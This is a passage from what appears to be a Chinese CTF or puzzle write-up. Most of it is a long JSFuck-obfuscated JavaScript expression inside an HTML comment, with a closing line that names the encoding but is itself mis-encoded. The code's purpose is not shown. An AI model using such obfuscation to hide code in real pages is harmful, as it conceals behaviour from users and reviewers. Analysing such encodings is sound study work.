class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>((+((+(+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()())<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>)<br>--&gt;<br></code></pre></td></tr></table></figure><p>æŸ¥äº†ä¸‹è¿™ä¸œè¥¿å«<code>jsfuck</code>ç¼–ç 